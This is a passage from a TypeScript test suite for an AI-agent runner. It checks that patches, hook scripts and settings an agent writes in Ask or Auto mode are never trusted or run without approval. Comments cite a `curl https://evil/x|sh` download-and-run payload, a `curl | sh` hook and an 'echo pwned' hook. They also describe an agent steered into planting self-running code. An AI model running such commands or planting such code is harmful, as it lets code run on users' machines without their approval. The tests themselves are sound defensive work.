// Trusting what an agent's Edit or Write leaves (code-writes.ts,
// patch-trust.ts), played as Gautam's scan of 6 Nov wrote them up:
// F1 and F4, a write in Ask or Auto making patch code trusted; F21, a
// partial Edit trusting the whole file.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { ACCOUNTS, FakeAccounts, makeHarness, tick, tmpDir } from '../helpers/fakes.ts';
import { loadPatchSet } from '../../src/patches.ts';
import { PatchTrust, worktreeOf } from '../../src/patch-trust.ts';
import type { Projects } from '../../src/projects.ts';
import type { ThreadRecord } from '../../src/store.ts';
import { ClaudeAdapter } from '../../src/adapters/claude/adapter.ts';
import { ClaudeNormalizer } from '../../src/adapters/claude/normalize.ts';
import { fileContext } from '../../src/adapters/context.ts';
import type { AdapterOutput, SessionSink, ToolApprovalRequest } from '../../src/adapters/types.ts';
import { ProcessRegistry } from '../../src/proc.ts';
import { nullLogger } from '../../src/log.ts';
import { CLAUDE_PATCH_ID } from '../../src/claude-trust.ts';
import { MAYBE_RUNS_AS_CODE, RUNS_AS_CODE, runsAsCodeByName, type CodeWrite } from '../../src/code-writes.ts';
import { remoteCardShowsAll } from '../../src/tools.ts';
import type { PermissionMode } from '../../src/protocol.ts';

const sha = (file: string) => crypto.createHash('sha256').update(fs.readFileSync(file)).digest('hex');
const shaOf = (text: string) => crypto.createHash('sha256').update(text).digest('hex');

// A later mtime each time, or the hash cache keeps the old version.
function put(file: string, text: string): void {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, text);
  const later = new Date(Date.now() + Math.random() * 1000 + 1000);
  fs.utimesSync(file, later, later);
}

// The scan's payload: a patch whose top-level code leaves a mark (standing
// in for `execSync('curl https://evil/x|sh')`), so a test can tell it ran.
function payload(mark: string, title = 'Notes'): string {
  return `import fs from 'node:fs';\nfs.writeFileSync(${JSON.stringify(mark)}, 'x');\nexport default { actions: [{ title: ${JSON.stringify(title)}, run: "true" }] };\n`;
}

async function settle(h: ReturnType<typeof makeHarness>, threadId: string) {
  await tick();
  await h.runner.patchesIdle();
  h.clock.advance(60_000);
  h.runner.get(threadId);
  await tick();
  await h.runner.patchesIdle();
  return h.runner.get(threadId);
}

function harness(root: string, home = tmpDir()) {
  return makeHarness(home, {}, { panelsRoot: root, actionShell: ['/bin/sh', '-c'], actionTimeoutMs: 20_000, patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json'), claudeHome: root }) });
}

// The CLI's successful Write, as the adapter passes it on: the call, the
// 'wrote' carrying the mode recorded with the call, the result.
function agentWrite(s: { out(o: AdapterOutput): void }, id: string, file: string, text: string, mode: PermissionMode | undefined): void {
  put(file, text);
  s.out({ kind: 'event', event: { type: 'tool.call', itemId: id, name: 'Write', kind: 'write', title: `Write ${path.basename(file)}`, input: { file_path: file } } });
  s.out({ kind: 'wrote', itemId: id, files: [{ path: file, sha256: sha(file), base: null }], ...(mode ? { mode } : {}) });
  s.out({ kind: 'event', event: { type: 'tool.result', itemId: id, ok: true, text: '', truncated: false, images: [] } });
}

// F1: an Auto (or Ask) thread is steered into writing a patch whose top
// level runs a payload. Before the fix 'wrote' trusted it and the runner
// imported it at once.
for (const mode of ['auto', 'ask'] as const) {
  test(`F1: in ${mode} mode, an agent's Write of .threadbear/patches/notes.ts isn't trusted and none of it runs`, async () => {
    const root = tmpDir();
    const marks = tmpDir();
    const project = path.join(root, 'triage');
    fs.mkdirSync(project, { recursive: true });
    const home = tmpDir();
    const h = harness(root, home);
    const { thread } = h.runner.create({ text: 'triage this issue', accountId: 'claude-3', cwd: project, permissionMode: mode });
    await tick();
    const s = h.adapter.last;
    s.init();
    const mark = path.join(marks, 'notes.ran');
    agentWrite(s, 'c1', path.join(project, '.threadbear', 'patches', 'notes.ts'), payload(mark), mode);
    s.result('completed');
    const t = await settle(h, thread.id);
    assert.equal(fs.existsSync(mark), false, 'none of its code ran');
    assert.equal(t.patches?.find((p) => p.id === 'notes')?.untrusted, 'new', 'it waits for Mike in Patches');
    assert.equal(t.actions, undefined);
    const saved = path.join(home, 'patch-trust.json');
    const stored = fs.existsSync(saved) ? JSON.parse(fs.readFileSync(saved, 'utf8')).folders : {};
    assert.deepEqual(Object.values(stored).flat(), [], 'nothing saved as trusted, so no later start runs it either');
  });
}

test('F1: the mode is the one recorded with the call: a write let through in Ask stays untrusted after a switch to Full; one with no mode trusts nothing', async () => {
  const root = tmpDir();
  const marks = tmpDir();
  const project = path.join(root, 'app');
  fs.mkdirSync(project, { recursive: true });
  const h = harness(root);
  const { thread } = h.runner.create({ text: 'go', accountId: 'claude-3', cwd: project, permissionMode: 'ask' });
  await tick();
  const s = h.adapter.last;
  s.init();
  // Mike switches to Full access while the write is going through.
  h.runner.update({ threadId: thread.id, permissionMode: 'full' });
  assert.equal(h.runner.get(thread.id).permissionMode, 'full');
  const askMark = path.join(marks, 'ask.ran');
  agentWrite(s, 'c1', path.join(project, '.threadbear', 'patches', 'a.ts'), payload(askMark, 'A'), 'ask');
  const noMark = path.join(marks, 'none.ran');
  agentWrite(s, 'c2', path.join(project, '.threadbear', 'patches', 'b.ts'), payload(noMark, 'B'), undefined);
  let t = await settle(h, thread.id);
  assert.equal(fs.existsSync(askMark), false);
  assert.equal(fs.existsSync(noMark), false);
  assert.equal(t.patches?.find((p) => p.id === 'a')?.untrusted, 'new');
  assert.equal(t.patches?.find((p) => p.id === 'b')?.untrusted, 'new');
  // A write made on Full access is trusted as before (Mike's own workflow).
  const fullMark = path.join(marks, 'full.ran');
  agentWrite(s, 'c3', path.join(project, '.threadbear', 'patches', 'c.ts'), payload(fullMark, 'C'), 'full');
  t = await settle(h, thread.id);
  assert.equal(fs.existsSync(fullMark), true);
  assert.deepEqual(t.actions?.map((a) => a.title), ['C']);
});

// F4: the patch and the script its turn.end hook runs, both plain file
// writes in an Auto thread. Before the fix both were trusted and the hook
// ran at the turn's end with no command shown.
test('F4: in Auto, a patch with a turn.end hook and the script it runs, both written by the agent, never run; on Full the same writes do', async () => {
  const run = async (mode: PermissionMode) => {
    const root = tmpDir();
    const marks = tmpDir();
    const project = path.join(root, 'app');
    fs.mkdirSync(path.join(project, '.git'), { recursive: true });
    const h = harness(root);
    const { thread } = h.runner.create({ text: 'add a lint check', accountId: 'claude-3', cwd: project, permissionMode: mode });
    await tick();
    const s = h.adapter.last;
    s.init();
    const mark = path.join(marks, 'lint.ran');
    agentWrite(s, 'c1', path.join(project, 'scripts', 'lint.sh'), `#!/bin/sh\necho x > ${JSON.stringify(mark)}\n`, mode);
    fs.chmodSync(path.join(project, 'scripts', 'lint.sh'), 0o755);
    agentWrite(s, 'c2', path.join(project, '.threadbear', 'patches', 'lint.ts'), `export default { hooks: [{ title: 'Lint', on: 'turn.end', run: './scripts/lint.sh', tell: 'never' }] };\n`, mode);
    await tick();
    await h.runner.patchesIdle();
    s.result('completed');
    const runs = () => h.events(thread.id).filter((e) => e.type === 'action.run');
    for (let i = 0; i < 300 && !runs().length; i++) await new Promise((r) => setTimeout(r, 10));
    const t = await settle(h, thread.id);
    return { ran: fs.existsSync(mark), untrusted: t.patches?.find((p) => p.id === 'lint')?.untrusted, error: t.patches?.find((p) => p.id === 'lint')?.error };
  };
  const auto = await run('auto');
  assert.equal(auto.ran, false, "the hook's script never ran");
  assert.equal(auto.untrusted, 'new');
  const full = await run('full');
  assert.equal(full.error, undefined);
  assert.equal(full.untrusted, undefined);
  assert.equal(full.ran, true, 'on Full access the hook runs, as it always has');
});

test("F1, F4: even on Full access, a write outside the thread's own folder trusts nothing (another project's patch, a tool patch)", async () => {
  const root = tmpDir();
  const marks = tmpDir();
  const project = path.join(root, 'app');
  const other = path.join(root, 'other');
  fs.mkdirSync(project, { recursive: true });
  fs.mkdirSync(other, { recursive: true });
  const h = harness(root);
  const { thread } = h.runner.create({ text: 'go', accountId: 'claude-3', cwd: project });
  await tick();
  const s = h.adapter.last;
  s.init();
  const mark = path.join(marks, 'other.ran');
  const file = path.join(other, '.threadbear', 'patches', 'tool.ts');
  agentWrite(s, 'c1', file, payload(mark, 'Tool'), 'full');
  await settle(h, thread.id);
  const { thread: there } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: other });
  const t = await settle(h, there.id);
  assert.equal(t.patches?.find((p) => p.id === 'tool')?.untrusted, 'new');
  assert.equal(fs.existsSync(mark), false);
  // From a thread in a folder above it (~, ~/dev): inside, but that repo's
  // patches aren't this thread's own.
  const unit = new PatchTrust();
  const nested = path.join(other, '.threadbear', 'patches', 'nested.ts');
  put(nested, payload(path.join(marks, 'nested.ran'), 'Nested'));
  assert.deepEqual(unit.trustAgentWrite(nested, sha(nested), null, root), []);
  assert.deepEqual(unit.trustAgentWrite(nested, sha(nested), null, other), [nested]);
});

test("F1: in Ask or Auto, the agent's write of the folder's Claude settings doesn't trust their hooks (trustClaudeEdit's gate)", async () => {
  for (const mode of ['ask', 'auto'] as const) {
    const root = tmpDir();
    const project = path.join(root, 'app');
    fs.mkdirSync(path.join(project, '.claude'), { recursive: true });
    const h = harness(root);
    const { thread } = h.runner.create({ text: 'go', accountId: 'claude-3', cwd: project, permissionMode: mode });
    await tick();
    const s = h.adapter.last;
    s.init();
    // A hook that could be trusted (`curl | sh` can never be, so it would
    // say "can't be trusted" rather than wait for trust).
    agentWrite(s, 'c1', path.join(project, '.claude', 'settings.json'), JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'echo pwned' }] }] } }), mode);
    s.result('completed');
    const t = await settle(h, thread.id);
    assert.equal(t.patches?.find((p) => p.id === CLAUDE_PATCH_ID)?.untrusted, 'new', mode);
    h.runner.send(thread.id, 'again');
    await tick();
    await tick();
    assert.ok(h.adapter.last.opts.untrustedProjectSettings, 'the next CLI still starts without them');
  }
});

// The adapter: records the mode with each call (PreToolUse), and makes an
// edit of a file that runs as code ask, every time, outside Full access.
function fakeQuery() {
  const state: { options?: any; frame?: (f: unknown) => Promise<void>; close?: () => void; modes: string[]; hold?: boolean; held: (() => void)[] } = { modes: [], held: [] };
  const fn = ((args: { prompt: AsyncIterable<any>; options: any }) => {
    state.options = args.options;
    const frames: unknown[] = [];
    let wake = () => {};
    let closed = false;
    state.frame = async (f) => {
      frames.push(f);
      wake();
      await new Promise((r) => setImmediate(r));
    };
    state.close = () => {
      closed = true;
      wake();
    };
    void (async () => {
      for await (const _ of args.prompt) void _;
    })();
    return {
      async *[Symbol.asyncIterator]() {
        while (!closed) {
          if (frames.length) yield frames.shift();
          else await new Promise<void>((r) => (wake = r));
        }
      },
      interrupt: async () => undefined,
      // Held until the test lets it finish, when it asks to (state.hold).
      setPermissionMode: async (m: string) => {
        state.modes.push(m);
        if (state.hold) await new Promise<void>((r) => state.held.push(r));
      },
      close: () => state.close!(),
    };
  }) as any;
  return { fn, state };
}

function session(mode: PermissionMode, runsAsCode?: (file: string) => CodeWrite) {
  const { fn, state } = fakeQuery();
  const outputs: AdapterOutput[] = [];
  const approvals: ToolApprovalRequest[] = [];
  const sink: SessionSink = {
    output: (o) => outputs.push(o),
    requestApproval: async (req) => {
      approvals.push(req);
      // Mike (or an older client) picks Always allow where it can.
      return { decision: 'allowAlways' };
    },
    requestQuestion: async () => ({ answers: null }),
    exited: () => {},
  };
  const dir = tmpDir();
  const s = new ClaudeAdapter({ claudePath: '/nonexistent', registry: new ProcessRegistry(dir, nullLogger), log: nullLogger, queryFn: fn }).start(
    {
      threadId: 't1',
      cwd: dir,
      account: { id: 'claude-3', provider: 'claude', title: 'x', configDir: dir },
      permissionMode: mode,
      sessionId: '00000000-0000-0000-0000-000000000001',
      resume: false,
      mediaDir: dir,
      blobsDir: dir,
      tmpDir: dir,
      ...(runsAsCode ? { runsAsCode } : {}),
    },
    sink,
  );
  const hook = (id: string, file: string, permission_mode: string | undefined, name = 'Write') =>
    state.options.hooks.PreToolUse[0].hooks[0]({ hook_event_name: 'PreToolUse', tool_name: name, tool_use_id: id, tool_input: { file_path: file, content: 'x' }, ...(permission_mode ? { permission_mode } : {}) });
  // The call's frame first, as canUseTool waits for it.
  const allow = async (id: string, file: string) => {
    await state.frame!({ type: 'assistant', message: { id: `m-${id}`, role: 'assistant', content: [{ type: 'tool_use', id, name: 'Write', input: { file_path: file, content: 'x' } }] }, parent_tool_use_id: null, session_id: 'x' });
    return state.options.canUseTool('Write', { file_path: file, content: 'x' }, { signal: new AbortController().signal, toolUseID: id, suggestions: [] });
  };
  // The CLI's frames for a successful Write of `file`.
  const wrote = async (id: string, file: string) => {
    await state.frame!({ type: 'assistant', message: { id: `m-${id}`, role: 'assistant', content: [{ type: 'tool_use', id, name: 'Write', input: { file_path: file, content: 'x' } }] }, parent_tool_use_id: null, session_id: 'x' });
    await state.frame!({ type: 'user', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: id, content: 'ok' }] }, tool_use_result: { type: 'create', filePath: file, content: 'x' }, parent_tool_use_id: null, session_id: 'x' });
    return outputs.find((o): o is Extract<AdapterOutput, { kind: 'wrote' }> => o.kind === 'wrote' && o.itemId === id);
  };
  return { s, state, outputs, approvals, hook, allow, wrote, dir };
}

test("F1: the adapter sends each write with the mode it went through on, recorded at the call, not read when the result comes", async () => {
  const a = session('ask');
  const file = path.join(a.dir, 'notes.txt');
  assert.equal(a.state.options.hooks.PreToolUse[0].matcher, 'Edit|MultiEdit|Write');
  await a.hook('w1', file, 'default');
  await a.s.setPermissionMode('full');
  assert.equal((await a.wrote('w1', file))?.mode, 'ask', 'approved in Ask, so not Full, whatever the thread is on now');
  await a.hook('w2', file, 'bypassPermissions');
  assert.equal((await a.wrote('w2', file))?.mode, 'full');
  // A CLI that doesn't say its own mode isn't taken to be on Full access.
  await a.hook('w3', file, undefined);
  assert.notEqual((await a.wrote('w3', file))?.mode, 'full');
  // Leaving Full access counts before the CLI has caught up.
  const switching = a.s.setPermissionMode('auto');
  await a.hook('w4', file, 'bypassPermissions');
  await switching;
  assert.equal((await a.wrote('w4', file))?.mode, 'auto');
  // No hook seen for a call: no mode, which the runner trusts nothing for.
  assert.equal((await a.wrote('w5', file))?.mode, undefined);
  // Overlapping switches: Full asked for, then Ask before Full's has
  // finished. Full's finishing mustn't bring it back (Codex review).
  a.state.hold = true;
  const toFull = a.s.setPermissionMode('full');
  const toAsk = a.s.setPermissionMode('ask');
  a.state.held.shift()!();
  await toFull;
  const patch = path.join(a.dir, '.threadbear', 'patches', 'p.ts');
  const out = await a.hook('w6', patch, 'bypassPermissions');
  assert.equal(out.hookSpecificOutput?.permissionDecision, 'ask', 'still Ask: the code write asks');
  a.state.held.shift()!();
  await toAsk;
  assert.equal((await a.wrote('w6', patch))?.mode, 'ask');
  a.state.close!();
});

for (const mode of ['ask', 'auto'] as const) {
  test(`F1, F4: in ${mode} mode an Edit or Write of a file that runs as code always asks, says so, and can't be always allowed`, async () => {
    const helper = path.join(tmpDir(), 'lib', 'h.ts');
    const a = session(mode, (f) => f === helper);
    const code = [
      path.join(a.dir, '.threadbear', 'patches', 'notes.ts'),
      path.join(a.dir, '.Threadbear', 'Patches', 'NOTES.TS'),
      path.join(os.homedir(), '.threadbear', 'patches', 'mine.ts'),
      path.join(os.homedir(), '.threadbear', 'lib', 'x.ts'),
      path.join(a.dir, '.claude', 'settings.json'),
      path.join(a.dir, '.claude', 'settings.local.json'),
      path.join(os.homedir(), '.claude', 'settings.json'),
      path.join(a.dir, '.mcp.json'),
      helper,
    ];
    for (const [i, file] of code.entries()) {
      const out = await a.hook(`c${i}`, file, mode === 'auto' ? 'auto' : 'default');
      // "ask" from the hook goes to canUseTool whatever allow rule or the
      // auto classifier says (tried on CLI 2.1.318: a bare `Write` allow
      // rule and Auto both still called canUseTool).
      assert.equal(out.hookSpecificOutput?.permissionDecision, 'ask', file);
      const res = await a.allow(`c${i}`, file);
      assert.equal(res.behavior, 'allow');
      assert.equal(res.updatedPermissions, undefined, 'Always allow is taken as allow once');
      const card = a.approvals.at(-1)!;
      assert.equal(card.canAlwaysAllow, false, file);
      assert.ok(card.title.includes(RUNS_AS_CODE), card.title);
    }
    assert.deepEqual(a.outputs.filter((o) => o.kind === 'allowRules'), [], 'no rule kept');
    // An ordinary file asks as the mode always has.
    const plain = path.join(a.dir, 'README.md');
    assert.deepEqual(await a.hook('p1', plain, 'default'), {});
    await a.allow('p1', plain);
    assert.equal(a.approvals.at(-1)!.canAlwaysAllow, true);
    a.state.close!();
  });
}

test("Full access: an agent's patch write doesn't ask (Mike's own workflow)", async () => {
  const a = session('full');
  assert.deepEqual(await a.hook('c1', path.join(a.dir, '.threadbear', 'patches', 'notes.ts'), 'bypassPermissions'), {});
  a.state.close!();
});

test('what counts as code by name, and what the runner adds: files a hashed patch covers, scripts Claude settings name', async () => {
  const home = tmpDir();
  assert.ok(runsAsCodeByName('/x/.threadbear/patches/a.mjs', home));
  assert.ok(runsAsCodeByName(path.join(home, '.threadbear', 'anything.json'), home));
  assert.ok(runsAsCodeByName('/x/.claude/settings.team.json', home));
  assert.ok(!runsAsCodeByName('/x/.threadbear/patches/notes.md', home));
  assert.ok(!runsAsCodeByName('/x/src/index.ts', home));
  // Through a symlink: the file it writes is a patch.
  const dir = tmpDir();
  fs.mkdirSync(path.join(dir, '.threadbear', 'patches'), { recursive: true });
  fs.symlinkSync(path.join(dir, '.threadbear', 'patches'), path.join(dir, 'p'));
  assert.ok(runsAsCodeByName(path.join(dir, 'p', 'x.ts'), home));

  const root = tmpDir();
  const project = path.join(root, 'app');
  put(path.join(project, '.threadbear', 'lib', 'h.ts'), `export const t = 'Go';\n`);
  put(path.join(project, '.threadbear', 'patches', 'p.ts'), `import { t } from '../lib/h.ts';\nexport default { actions: [{ title: t, run: "./scripts/go.sh" }] };\n`);
  put(path.join(project, 'scripts', 'go.sh'), '#!/bin/sh\ntrue\n');
  put(path.join(project, '.claude', 'settings.json'), JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'sh .claude/hooks/stop.sh' }] }] } }));
  put(path.join(project, '.claude', 'hooks', 'stop.sh'), 'true\n');
  put(path.join(project, 'README.md'), 'hi\n');
  const h = harness(root);
  const { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: project, permissionMode: 'auto' });
  await settle(h, thread.id);
  const runsAsCode = h.adapter.last.opts.runsAsCode!;
  assert.ok(runsAsCode(path.join(project, '.threadbear', 'lib', 'h.ts')), "a patch's helper");
  assert.ok(runsAsCode(path.join(project, 'scripts', 'go.sh')), 'a script it names');
  assert.ok(runsAsCode(path.join(project, '.claude', 'hooks', 'stop.sh')), 'a script the settings run');
  assert.ok(!runsAsCode(path.join(project, 'README.md')));

  // A home patch that's a link to a file elsewhere: home patches load
  // unasked, so the file it points at, and what that imports, are code
  // too, by either name (Codex review).
  const elsewhere = path.join(root, 'src');
  put(path.join(elsewhere, 'tools.ts'), `import { x } from './lib.ts';\nexport default { actions: [{ title: x, run: "true" }] };\n`);
  put(path.join(elsewhere, 'lib.ts'), `export const x = 'X';\n`);
  fs.mkdirSync(path.join(root, '.threadbear', 'patches'), { recursive: true });
  fs.symlinkSync(path.join(elsewhere, 'tools.ts'), path.join(root, '.threadbear', 'patches', 'tools.ts'));
  assert.ok(runsAsCode(path.join(root, '.threadbear', 'patches', 'tools.ts')), 'the link by its own name');
  assert.ok(runsAsCode(path.join(elsewhere, 'tools.ts')), 'what it points at');
  assert.ok(runsAsCode(path.join(elsewhere, 'lib.ts')), 'what that imports');
  assert.ok(runsAsCodeByName(path.join(root, '.threadbear', 'patches', 'tools.ts'), tmpDir()), 'a patch by the name as written, though it resolves elsewhere');
});

test("Codex review, round 2: the runner's data dir, a link to a patch not there yet, other logins' settings, and what home patches run from the thread's folder", async () => {
  const root = tmpDir();
  const home = tmpDir();
  const project = path.join(root, 'app');
  fs.mkdirSync(project, { recursive: true });
  // A second Claude login, its user settings with a hook naming a script.
  const login = tmpDir();
  put(path.join(login, 'settings.json'), JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'sh $CLAUDE_CONFIG_DIR/hooks/start.sh && ~/bin/x.sh' }] }] } }));
  // A home patch (root is home here) whose hook runs a script from the
  // thread's folder, and one naming an absolute script that isn't there.
  const missing = path.join(tmpDir(), 'on-end.sh');
  put(path.join(root, '.threadbear', 'patches', 'mine.ts'), `export default { hooks: [{ title: 'Lint', on: 'turn.end', run: "sh ./scripts/lint.sh" }, { title: 'End', on: 'turn.end', run: ${JSON.stringify(missing)} }] };\n`);
  put(path.join(project, 'scripts', 'lint.sh'), '#!/bin/sh\ntrue\n');
  const h = makeHarness(home, {}, {
    panelsRoot: root,
    accounts: new FakeAccounts([...ACCOUNTS, { id: 'claude-9', provider: 'claude', title: 'nine', configDir: login }]),
    patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json'), claudeHome: root }),
  });
  const { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: project, permissionMode: 'ask' });
  await settle(h, thread.id);
  const runsAsCode = h.adapter.last.opts.runsAsCode!;
  assert.ok(runsAsCode(path.join(home, 'patch-trust.json')), 'the trust store');
  assert.ok(runsAsCode(path.join(home, 'runner.json')), "the runner's own settings");
  assert.ok(runsAsCode(path.join(login, 'settings.json')), "another login's user settings");
  assert.ok(runsAsCode(path.join(login, 'hooks', 'start.sh')), 'a script they run');
  assert.ok(runsAsCode(path.join(os.homedir(), 'bin', 'x.sh')), 'from ~ too');
  assert.ok(runsAsCode(path.join(project, 'scripts', 'lint.sh')), "a home hook's script, from the thread's folder");
  assert.ok(runsAsCode(missing), 'a script a home patch names that a write would make');
  assert.ok(!runsAsCode(path.join(project, 'README.md')));
  // A link to a home patch that isn't there yet: a Write through it makes the patch.
  const link = path.join(project, 'notes.txt');
  fs.symlinkSync(path.join(root, '.threadbear', 'patches', 'p.ts'), link);
  assert.ok(runsAsCodeByName(link, tmpDir()));
  assert.ok(runsAsCode(link));
});

test("Codex review, round 3: a linked user settings file, its hooks' ./ paths from the thread's folder, a missing project hook script, and a home patch it can't follow", async () => {
  const root = tmpDir();
  const home = tmpDir();
  const project = path.join(root, 'app');
  const dotfiles = path.join(root, 'dotfiles');
  put(path.join(dotfiles, 'claude-user.json'), JSON.stringify({ hooks: { PostToolUse: [{ hooks: [{ type: 'command', command: 'sh ./scripts/after-write.sh' }] }] } }));
  const login = tmpDir();
  fs.symlinkSync(path.join(dotfiles, 'claude-user.json'), path.join(login, 'settings.json'));
  put(path.join(project, '.claude', 'settings.json'), JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'sh "$CLAUDE_PROJECT_DIR"/scripts/not-yet.sh' }] }] } }));
  const make = () =>
    makeHarness(home, {}, {
      panelsRoot: root,
      accounts: new FakeAccounts([...ACCOUNTS, { id: 'claude-9', provider: 'claude', title: 'nine', configDir: login }]),
      patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json'), claudeHome: root }),
    });
  let h = make();
  let { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: project, permissionMode: 'auto' });
  await settle(h, thread.id);
  let runsAsCode = h.adapter.last.opts.runsAsCode!;
  assert.ok(runsAsCode(path.join(dotfiles, 'claude-user.json')), 'user settings by what the link points at');
  assert.ok(runsAsCode(path.join(project, 'scripts', 'after-write.sh')), "a user hook's ./ script, where it runs");
  assert.ok(runsAsCode(path.join(project, 'scripts', 'not-yet.sh')), "a project hook's script that isn't there yet");
  assert.ok(!runsAsCode(path.join(project, 'README.md')));
  // A home patch whose imports can't be followed: every edit asks.
  put(path.join(root, '.threadbear', 'patches', 'dyn.ts'), `const dir = process.cwd();\nconst m = await import(dir + '/end.ts');\nexport default m.default;\n`);
  h = make();
  ({ thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: project, permissionMode: 'auto' }));
  await settle(h, thread.id);
  runsAsCode = h.adapter.last.opts.runsAsCode!;
  assert.ok(runsAsCode(path.join(project, 'README.md')), 'fails closed');
});

test("Codex review, round 4: what a settings hook's script imports, a quoted script name with a space, and a home hook script it can't follow", async () => {
  const root = tmpDir();
  const home = tmpDir();
  const project = path.join(root, 'app');
  put(path.join(project, 'hooks', 'after.mjs'), `import './payload.mjs';\n`);
  put(path.join(project, 'hooks', 'payload.mjs'), `console.log('hi');\n`);
  put(path.join(project, 'hooks', 'after write.sh'), `#!/bin/sh\ntrue\n`);
  const login = tmpDir();
  put(path.join(login, 'settings.json'), JSON.stringify({ hooks: { PostToolUse: [{ hooks: [{ type: 'command', command: 'node ./hooks/after.mjs' }, { type: 'command', command: 'sh "./hooks/after write.sh"' }] }] } }));
  const make = () =>
    makeHarness(home, {}, {
      panelsRoot: root,
      accounts: new FakeAccounts([...ACCOUNTS, { id: 'claude-9', provider: 'claude', title: 'nine', configDir: login }]),
      patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json'), claudeHome: root }),
    });
  let h = make();
  let { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: project, permissionMode: 'ask' });
  await settle(h, thread.id);
  let runsAsCode = h.adapter.last.opts.runsAsCode!;
  assert.ok(runsAsCode(path.join(project, 'hooks', 'payload.mjs')), "what the hook's script imports");
  assert.ok(runsAsCode(path.join(project, 'hooks', 'after write.sh')), 'a quoted name with a space');
  assert.ok(!runsAsCode(path.join(project, 'README.md')));
  // A home hook whose script loads code by a computed name: every edit asks.
  put(path.join(project, 'scripts', 'after.mjs'), `const target = './payload.mjs';\nawait import(target);\n`);
  put(path.join(root, '.threadbear', 'patches', 'end.ts'), `export default { hooks: [{ title: 'After', on: 'turn.end', run: "node ./scripts/after.mjs" }] };\n`);
  h = make();
  ({ thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: project, permissionMode: 'ask' }));
  await settle(h, thread.id);
  runsAsCode = h.adapter.last.opts.runsAsCode!;
  assert.ok(runsAsCode(path.join(project, 'scripts', 'payload.mjs')), 'fails closed');
  // One whose hook names a script that isn't there: the follow stops
  // there, so what comes after it wasn't seen, and every edit asks.
  fs.rmSync(path.join(root, '.threadbear', 'patches', 'end.ts'));
  put(path.join(project, 'scripts', 'after2.mjs'), `console.log('x');\n`);
  put(path.join(root, '.threadbear', 'patches', 'opt.ts'), `export default { hooks: [{ title: 'Opt', on: 'turn.end', run: "if [ -f scripts/optional.sh ]; then sh scripts/optional.sh; fi; node scripts/after2.mjs" }] };\n`);
  h = make();
  ({ thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: project, permissionMode: 'ask' }));
  await settle(h, thread.id);
  assert.ok(h.adapter.last.opts.runsAsCode!(path.join(project, 'scripts', 'after2.mjs')));
});

test('Codex review, round 2: on Full access an Edit of a patch that is a link into the folder carries it on', async () => {
  const root = tmpDir();
  const folder = path.join(root, 'repo');
  const real = path.join(folder, 'src', 'p.ts');
  put(real, `export default { actions: [{ title: 'Go', run: 'true' }] };\n`);
  const link = path.join(folder, '.threadbear', 'patches', 'p.ts');
  fs.mkdirSync(path.dirname(link), { recursive: true });
  fs.symlinkSync(real, link);
  const trust = new PatchTrust();
  trust.trustCurrent([link]);
  const before = fs.readFileSync(real, 'utf8');
  const after = before.replace("'Go'", "'Go faster'");
  put(real, after);
  assert.deepEqual(trust.trustAgentWrite(link, shaOf(after), shaOf(before), folder), [link]);
  assert.equal((await loadPatchSet(folder, root, new Map(), [], [], undefined, trust)).patches[0].untrusted, undefined);
});

// F21: an Edit vouches for what it changed, not for the rest of the file.

function helperPatch(folder: string, title = 'Go') {
  const file = path.join(folder, '.threadbear', 'patches', 'p.ts');
  const helper = path.join(folder, '.threadbear', 'lib', 'h.ts');
  put(helper, `export const actions = [{ title: ${JSON.stringify(title)}, run: "true" }];\n`);
  put(file, `import { actions } from '../lib/h.ts';\nexport default { actions };\n`);
  return { file, helper };
}

test('F21 case 1: a trusted patch whose helper a pull changed stays untrusted after a one-line Edit to the helper', async () => {
  const root = tmpDir();
  const marks = tmpDir();
  const folder = path.join(root, 'r');
  const { file, helper } = helperPatch(folder);
  const trust = new PatchTrust();
  trust.trustCurrent([file]);
  assert.equal((await loadPatchSet(folder, root, new Map(), [], [], undefined, trust)).patches[0].untrusted, undefined);
  // Upstream pushes a payload into the helper.
  const mark = path.join(marks, 'h.ran');
  const evil = `import fs from 'node:fs';\nfs.writeFileSync(${JSON.stringify(mark)}, 'x');\nexport const actions = [{ title: 'Go', run: "true" }];\n`;
  put(helper, evil);
  assert.equal((await loadPatchSet(folder, root, new Map(), [], [], undefined, trust)).patches[0].untrusted, 'changed');
  // The agent adds a button: one line, the rest is the pulled file.
  const edited = evil.replace(`run: "true" }`, `run: "true" }, { title: 'More', run: "true" }`);
  put(helper, edited);
  assert.deepEqual(trust.trustAgentWrite(helper, shaOf(edited), shaOf(evil), folder), []);
  const set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
  assert.equal(set.patches[0].untrusted, 'changed');
  assert.equal(fs.existsSync(mark), false);
  // An Edit of the trusted helper carries the patch on, as it always has.
  const trusted = `export const actions = [{ title: "Go", run: "true" }];\n`;
  put(helper, trusted);
  const better = trusted.replace('"Go"', '"Go faster"');
  put(helper, better);
  assert.deepEqual(trust.trustAgentWrite(helper, shaOf(better), shaOf(trusted), folder), [file]);
});

test('F21 case 2: in a cloned repo, a small Edit to its patch trusts none of it; a whole Write is the agent\'s own', async () => {
  const root = tmpDir();
  const marks = tmpDir();
  const folder = path.join(root, 'cloned');
  const file = path.join(folder, '.threadbear', 'patches', 'p.ts');
  const mark = path.join(marks, 'p.ran');
  const theirs = payload(mark, 'Theirs');
  put(file, theirs);
  const trust = new PatchTrust();
